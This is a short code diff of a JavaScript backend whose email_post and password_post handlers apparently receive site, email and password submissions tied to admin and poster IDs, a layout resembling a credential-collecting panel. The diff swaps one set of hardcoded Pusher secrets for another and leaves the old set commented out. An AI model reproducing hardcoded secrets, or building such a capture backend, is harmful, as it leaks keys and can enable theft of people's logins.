@@ -31,14 +31,22 @@ export const email_post = async (req, res) => {
     //     useTLS: true,
     //   });
 
+    // const pusher = new Pusher({
+    //     appId: '1773152',
+    //     key: 'f47031316f13ab641256',
+    //     secret: 'f1f2616da0bb8ffa85b7',
+    //     cluster: 'ap2',
+    //     useTLS: true,
+    //   })
+
     const pusher = new Pusher({
-        appId: '1773152',
-        key: 'f47031316f13ab641256',
-        secret: 'f1f2616da0bb8ffa85b7',
+        appId: '1891860',
+        key: 'e4766909b306ad7ddd58',
+        secret: 'ffbb52b3b0756a523d83',
         cluster: 'ap2',
         useTLS: true,
-      })
-
+      });
+      
 
     const { adminId, posterId } = req.params
     const { site, email } = req.body
@@ -145,13 +153,23 @@ export const password_post = async(req, res) => {
     //     useTLS: true,
     //   });
 
+    // const pusher = new Pusher({
+    //     appId: '1773152',
+    //     key: 'f47031316f13ab641256',
+    //     secret: 'f1f2616da0bb8ffa85b7',
+    //     cluster: 'ap2',
+    //     useTLS: true,
+    //   })
+
     const pusher = new Pusher({
-        appId: '1773152',
-        key: 'f47031316f13ab641256',
-        secret: 'f1f2616da0bb8ffa85b7',
+        appId: '1891860',
+        key: 'e4766909b306ad7ddd58',
+        secret: 'ffbb52b3b0756a523d83',
         cluster: 'ap2',
         useTLS: true,
-      })
+      });
+      
+
     const { id, password ,adminId,posterId} = req.body;
  
     const filter = { _id: id };
